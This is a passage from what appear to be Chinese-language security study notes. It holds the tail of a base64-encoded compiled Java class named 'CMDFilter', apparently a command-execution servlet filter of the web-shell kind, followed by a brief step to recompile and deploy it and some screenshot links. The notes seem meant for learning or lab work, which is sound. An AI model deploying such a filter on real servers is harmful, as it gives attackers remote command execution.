ZXB0aW9uAQAHZGVzdHJveQEAClNvdXJjZUZpbGUBAA5DTURGaWx0ZXIuamF2YQAhAHIAAgABAHQAAAAEAAEABQAGAAEAdgAAADMAAQABAAAABSq3AAGxAAAAAgB3AAAACgACAAAAEAAEABEAeAAAAAwAAQAAAAUAeQB6AAAAAQB7AHwAAQB2AAAANQAAAAIAAAABsQAAAAIAdwAAAAYAAQAAABUAeAAAABYAAgAAAAEAeQB6AAAAAAABAH0AfgABAAEAcAB/AAIAdgAAAewABQALAAAA2SwSB7kACQIALBIPuQARAgAsuQAUAQASGLYAGivAAB86BBkEEiG5ACMCAMYApgQ2BRInuAApOgYZBsYAExkGtgAuEjS2ADaZAAYDNgUVBZkAIAa9AC9ZAxI6U1kEEjxTWQUZBBIhuQAjAgBTpwAdBr0AL1kDEj5TWQQSQFNZBRkEEiG5ACMCAFM6B7gAQhkHtgBItgBMOgi7AFJZGQi3AFQSV7YAWToJGQm2AF2ZAAsZCbYAYacABRJkOgosuQAUAQAZCrYAZiy5ABQBALYAabEtKyy5AGwDALEAAAADAHcAAABOABMAAAAaAAgAGwAQABwAGwAdACEAHgAtAB8AMAAgADcAIQBJACIATAAkAG4AJQCKACYAlwAnAKcAKAC7ACkAxgAqAM8AKwDQAC0A2AAuAHgAAABwAAsAMACgAIAAgQAFADcAmQCCAIMABgCKAEYAhACFAAcAlwA5AIYAhwAIAKcAKQCIAIkACQC7ABUAigCDAAoAAADZAHkAegAAAAAA2QCLAIwAAQAAANkAjQCOAAIAAADZAI8AkAADACEAuACRAJIABACTAAAANwAG/gBMBwAfAQcALyFZBwCU/gAuBwCUBwCVBwBSQQcAL/8AFgAFBwByBwCXBwAKBwBtBwAfAAAAmQAAAAYAAgCaAJwAAQCeAAYAAQB2AAAAKwAAAAEAAAABsQAAAAIAdwAAAAYAAQAAADIAeAAAAAwAAQAAAAEAeQB6AAAAAQCfAAAAAgCg
```

![image-20240927164023672](http://cdn.ayusummer233.top/DailyNotes/202409271640926.png)

替换相应代码重新编译部署:

![image-20240927165209453](http://cdn.ayusummer233.top/DailyNotes/202409271652626.png)

![image-20240927165254650](http://cdn.ayusummer233.top/DailyNotes/202409271652781.png)

![image-20240927165410731](http://cdn.ayusummer233.top/DailyNotes/202409271654850.png)

----
